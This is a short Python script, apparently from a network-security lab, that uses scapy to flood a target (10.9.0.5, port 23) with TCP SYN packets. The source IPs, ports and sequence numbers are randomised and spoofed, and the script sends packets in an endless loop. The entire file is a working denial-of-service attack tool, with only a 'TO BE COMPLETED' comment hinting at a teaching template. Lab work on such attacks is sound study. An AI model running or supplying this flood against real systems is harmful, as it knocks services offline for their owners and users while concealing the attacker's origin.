#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

dst_ip = "10.9.0.5"
dst_port = 23

ip = IP(dst=dst_ip)
tcp = TCP(dport=dst_port, flags='S')	# TO BE COMPLETED
pkt = ip/tcp

print(f'[⚔️  TARGET] {dst_ip}/{dst_port}')
print('[⌛ SENDING PACKETS]')

i = 0
while True:
	pkt[IP].src = str(IPv4Address(getrandbits(32)))	# Source IP
	pkt[TCP].sport = getrandbits(16)	# Source Port
	pkt[TCP].seq = getrandbits(32)		# Sequence Number

	send(pkt, verbose = 0)

	i += 1
	if i%100 == 0:
		print(f'[📤 PACKETS SENT] {i}')